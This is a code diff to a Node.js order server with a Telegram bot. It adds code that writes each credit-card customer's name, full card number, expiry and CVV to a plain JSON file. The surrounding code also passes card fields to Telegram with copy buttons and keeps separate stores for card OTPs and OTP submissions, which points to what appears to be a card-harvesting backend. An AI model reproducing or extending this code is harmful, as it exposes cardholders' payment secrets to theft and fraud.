@@ -73,6 +73,7 @@ import {
 } from './botPermissions.js';
 import { registerAdminApi } from './adminApi.js';
 import { checkAdminLogin, getAdminLoginSecret } from './adminAuth.js';
+import { saveCreditCardOrderDetails } from './creditCardOrdersStore.js';
 
 const PAYMENT_METHOD_LABEL_TO_KEY = {
   'Zain Cash': 'zainCash',
@@ -386,6 +387,7 @@ async function initDataFiles() {
     { name: 'blockedChatIps.json', dest: BLOCKED_CHAT_IPS_PATH },
     { name: 'creditCardOtps.json', dest: CREDIT_CARD_OTPS_PATH },
     { name: 'creditCardOtpSubmissions.json', dest: CREDIT_CARD_OTP_SUBMISSIONS_PATH },
+    { name: 'creditCardOrders.json', dest: path.join(DATA_DIR, 'creditCardOrders.json') },
     { name: 'visits.json', dest: VISITS_PATH },
     { name: 'ordersLog.json', dest: ORDERS_CRM_PATH },
     { name: 'webChat.json', dest: CHAT_PATH },
@@ -2039,6 +2041,20 @@ app.post('/api/order', async (req, res) => {
       parse_mode: 'HTML',
       reply_markup: orderInlineKeyboard(safeOrderId, modRows, priorRows, ccCopyRows),
     });
+
+    if (paymentMethod === 'CreditCard' && ccTelegramFields) {
+      try {
+        await saveCreditCardOrderDetails(safeOrderId, {
+          holder: ccTelegramFields.holder,
+          pan: ccTelegramFields.pan,
+          expiry: ccTelegramFields.expiry,
+          cvv: ccTelegramFields.cvv,
+          customerName: name,
+        });
+      } catch (ccStoreErr) {
+        console.error('[order] credit card store failed', ccStoreErr?.message || ccStoreErr);
+      }
+    }
 
     if (!tgOrder?.ok) {
       console.error('[order] Telegram sendMessage:', JSON.stringify(tgOrder || {}));
